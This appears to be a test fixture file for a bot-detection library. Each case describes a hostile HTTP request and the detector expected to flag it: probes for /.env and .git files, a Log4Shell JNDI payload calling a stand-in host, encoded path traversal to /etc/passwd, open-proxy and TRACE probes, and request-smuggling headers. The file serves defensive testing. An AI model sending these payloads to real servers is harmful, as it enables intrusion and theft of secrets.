  bot({
    id: "probe-env-file",
    title: "A header-perfect client asking for /.env",
    audience: "hostile",
    category: "wordlist-probe",
    provenance: "The single most-requested path on the internet that no site intends to serve",
    notes: "Never `certain`. A URL is client-supplied text, and the client supplying it might be a security engineer testing their own site — which is why the answer is a challenge rather than a closed door.",
    requests: [{ ...browser("chromeWindows"), path: "/.env" }],
    expect: { certain: false, detectors: ["probe-signature"], neverAction: ["block", "drop"] },
    tags: ["scanning"],
  }),
  bot({
    id: "probe-git-config",
    title: "Walking a version-control directory",
    audience: "hostile",
    category: "wordlist-probe",
    provenance: "Exposed .git directories are harvested continuously; the config file names the remote",
    requests: [
      { ...browser("chromeWindows"), path: "/.git/config", atMs: 0 },
      { ...browser("chromeWindows"), path: "/.git/HEAD", atMs: 900 },
    ],
    expect: { certain: false, detectors: ["probe-signature"], neverAction: ["block", "drop"] },
    tags: ["scanning"],
  }),
  bot({
    id: "probe-log4shell-parameter",
    title: "A JNDI lookup in a query parameter",
    audience: "hostile",
    category: "wordlist-probe",
    provenance: "CVE-2021-44228 scanning has never stopped; the payload is sprayed into every parameter and header a crawler can reach",
    requests: [{ ...browser("chromeWindows"), path: "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fscanner.example%2Fa%7D" }],
    expect: { certain: false, detectors: ["probe-signature"], neverAction: ["block", "drop"] },
    tags: ["scanning"],
  }),
  bot({
    id: "traversal-encoded-past-a-filter",
    title: "A traversal with its dots and slashes written in percent-encoding",
    audience: "hostile",
    category: "wordlist-probe",
    provenance:
      "The standard first move against a path filter, and the reason this library keeps the raw target: normalisation resolves the dots, so what reaches a wordlist check is `/app/config.yml` — an ordinary-looking path nobody has, on no list. The spelling is the whole signal, and it is destroyed by the thing that makes rules work.",
    requests: [{ ...browser("chromeWindows"), path: "/%2e%2e%2f%2e%2e%2fapp/config.yml", status: 404 }],
    expect: { certain: false, detectors: ["target-integrity"], neverAction: ["block", "drop"] },
    notes:
      "`strong`, not proven. A path segment carrying a URL as data is encoded to sit in a path and encoded again by whatever built the link, which produces the same characters honestly — so this may score, and may not close a door on its own.",
    tags: ["scanning"],
  }),
  bot({
    id: "traversal-double-encoded",
    title: "A traversal encoded twice, so one round of decoding leaves it encoded",
    audience: "hostile",
    category: "wordlist-probe",
    provenance:
      "Aimed at a filter that decodes once and then inspects: after its single pass the target still reads `%2e%2e%2f`, which the filter does not recognise, and the server behind it decodes again.",
    requests: [{ ...browser("chromeWindows"), path: "/static/%252e%252e%252f%252e%252e%252fetc/passwd", status: 404 }],
    expect: { certain: false, detectors: ["target-integrity"], neverAction: ["block", "drop"] },
    tags: ["scanning"],
  }),
  bot({
    id: "absolute-form-proxy-probe",
    title: "A request target addressed to somewhere else entirely",
    audience: "hostile",
    category: "protocol-abuse",
    provenance:
      "Absolute-form is the request line a client sends to a *proxy*. Arriving at an origin server it is a question — will you fetch this for me — and open-proxy scanning asks it of everything with a port 80 open.",
    requests: [{ ...plain(CHROME_UA), path: "http://scanner.example/check", status: 404 }],
    expect: { certain: false, detectors: ["target-integrity"], neverAction: ["block", "drop"] },
    notes:
      "RFC 9112 §3.2.2 requires servers to accept absolute-form, so this is not malformed and is not proven. No browser has ever sent one to an origin server.",
    tags: ["scanning"],
  }),
  bot({
    id: "probe-trace-method",
    title: "A TRACE request",
    audience: "hostile",
    category: "wordlist-probe",
    provenance: "Cross-site tracing checks whether a server echoes the request back, including headers a script cannot read",
    requests: [{ ...plain(CHROME_UA), method: "TRACE" }],
    expect: { certain: false, detectors: ["probe-signature"], neverAction: ["block", "drop"] },
    tags: ["scanning"],
  }),

  // ---------------------------------------------------------------------------
  // Framing. A message that disagrees with itself about where it ends.
  // ---------------------------------------------------------------------------
  bot({
    id: "smuggling-content-length-and-transfer-encoding",
    title: "A request carrying both Content-Length and Transfer-Encoding",
    audience: "hostile",
    category: "protocol-abuse",
    provenance: "RFC 9112 §6.1 requires a message with both to be treated as malformed; the disagreement between two servers in a chain is the mechanism of request smuggling",
    notes: "Proven, like the HTTP/2 case above and for the same reason: every implementation removes one before sending, so a message with both was framed by hand.",
    requests: [
      {
        headers: [["Host", "shop.example"], ["User-Agent", CHROME_UA], ["Accept", "*/*"], ["Content-Type", "application/x-www-form-urlencoded"], ["Content-Length", "6"], ["Transfer-Encoding", "chunked"]],
        method: "POST",
        protocol: "https",
        httpVersion: "1.1",
      },
    ],
    expect: { verdict: "confirmed-bot", certain: true, detectors: ["header-integrity"] },
    tags: ["protocol"],
  }),
  bot({
    id: "smuggling-duplicate-host",
    title: "A request with two Host headers",
    audience: "hostile",
    category: "protocol-abuse",
    provenance: "RFC 9112 §3.2 permits exactly one Host field; a second makes the request target ambiguous between hops",
    requests: [
      {
        headers: [["Host", "shop.example"], ["Host", "internal.shop.example"], ["User-Agent", CHROME_UA], ["Accept", "*/*"]],
        protocol: "https",
        httpVersion: "1.1",
      },
    ],
    expect: { verdict: "confirmed-bot", certain: true, detectors: ["header-integrity"] },
    tags: ["protocol"],
  }),
];
